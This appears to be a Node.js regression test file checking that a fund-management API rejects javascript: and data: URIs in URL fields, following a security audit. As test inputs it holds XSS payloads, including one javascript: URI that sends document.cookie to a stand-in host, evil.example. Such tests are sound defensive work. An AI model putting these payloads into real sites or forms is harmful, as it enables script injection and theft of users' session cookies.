// Regression coverage for the dangerous-URL-scheme guard (QA Security
// audit follow-up, 2026-08-24): "*url" fields (lpaUrl, saUrl, pitchDeckUrl,
// dataRoomUrl, wireConfirmUrl, ...) get rendered as href/iframe src
// elsewhere (js/onboarding.js's _obOpenPreviewModal, js/lp-register.js) —
// those are correctly HTML-attribute-escaped, but nothing stopped the
// VALUE itself from being a javascript:/data: URI, which becomes live
// script once rendered as a real href/src regardless of escaping.
const { test, before, after } = require('node:test');
const assert = require('node:assert/strict');
const { createTestServer } = require('./helpers');

let server;
let fundId;

before(async () => {
  server = await createTestServer({ port: 4132 });
  const fund = await (await server.apiFetch('/api/funds', { method: 'POST', body: JSON.stringify({ name: 'URLGUARD_FUND' }) })).json();
  fundId = fund.id;
});

after(async () => { await server.stop(); });

test('a real Google Drive https:// link in lpaUrl is accepted', async () => {
  const res = await server.apiFetch('/api/lp', {
    method: 'POST',
    body: JSON.stringify({
      fundId, name: 'URLGUARD_LP_OK', type: 'Юридическое лицо', lpType: 'Institution', country: 'Test',
      commitment: 1, status: 'Active', registerId: 'UG-1',
      lpaUrl: 'https://drive.google.com/file/d/abc123/view',
    }),
  });
  assert.equal(res.status, 201);
});

test('a javascript: URI in lpaUrl is rejected (400)', async () => {
  const res = await server.apiFetch('/api/lp', {
    method: 'POST',
    body: JSON.stringify({
      fundId, name: 'URLGUARD_LP_BAD', type: 'Юридическое лицо', lpType: 'Institution', country: 'Test',
      commitment: 1, status: 'Active', registerId: 'UG-2',
      lpaUrl: "javascript:fetch('https://evil.example/steal?c='+document.cookie)",
    }),
  });
  assert.equal(res.status, 400);
  const body = await res.json();
  assert.match(body.error, /lpaUrl/);
  assert.match(body.error, /URL scheme/);
});

test('a whitespace-obfuscated javascript: URI ("java\\tscript:") is still caught', async () => {
  const res = await server.apiFetch('/api/lp', {
    method: 'POST',
    body: JSON.stringify({
      fundId, name: 'URLGUARD_LP_BAD2', type: 'Юридическое лицо', lpType: 'Institution', country: 'Test',
      commitment: 1, status: 'Active', registerId: 'UG-3',
      saUrl: 'java\tscript:alert(1)',
    }),
  });
  assert.equal(res.status, 400);
});

test('a data: URI is rejected (400)', async () => {
  const res = await server.apiFetch('/api/lp', {
    method: 'POST',
    body: JSON.stringify({
      fundId, name: 'URLGUARD_LP_BAD3', type: 'Юридическое лицо', lpType: 'Institution', country: 'Test',
      commitment: 1, status: 'Active', registerId: 'UG-4',
      lpaUrl: 'data:text/html,<script>alert(1)</script>',
    }),
  });
  assert.equal(res.status, 400);
});

test('a dangerous URL nested inside a deal update is rejected (400)', async () => {
  const deal = await (await server.apiFetch('/api/deals', {
    method: 'POST', body: JSON.stringify({ fundId, company: 'URLGUARD_DEAL', sector: 'Test', amount: 1, stage: 'Скрининг' }),
  })).json();
  const res = await server.apiFetch(`/api/deals/${deal.id}`, {
    method: 'PUT', body: JSON.stringify({ pitchDeckUrl: 'javascript:alert(document.domain)' }),
  });
  assert.equal(res.status, 400);
});

test('a request with no *url fields at all is unaffected', async () => {
  const res = await server.apiFetch('/api/lp', {
    method: 'POST',
    body: JSON.stringify({
      fundId, name: 'URLGUARD_LP_PLAIN', type: 'Юридическое лицо', lpType: 'Institution', country: 'Test',
      commitment: 1, status: 'Active', registerId: 'UG-5', notes: 'no url fields here',
    }),
  });
  assert.equal(res.status, 201);
});

test('a non-URL free-text placeholder in a *url field ("N/A") is left alone', async () => {
  const res = await server.apiFetch('/api/lp', {
    method: 'POST',
    body: JSON.stringify({
      fundId, name: 'URLGUARD_LP_NA', type: 'Юридическое лицо', lpType: 'Institution', country: 'Test',
      commitment: 1, status: 'Active', registerId: 'UG-6', lpaUrl: 'N/A',
    }),
  });
  assert.equal(res.status, 201);
});
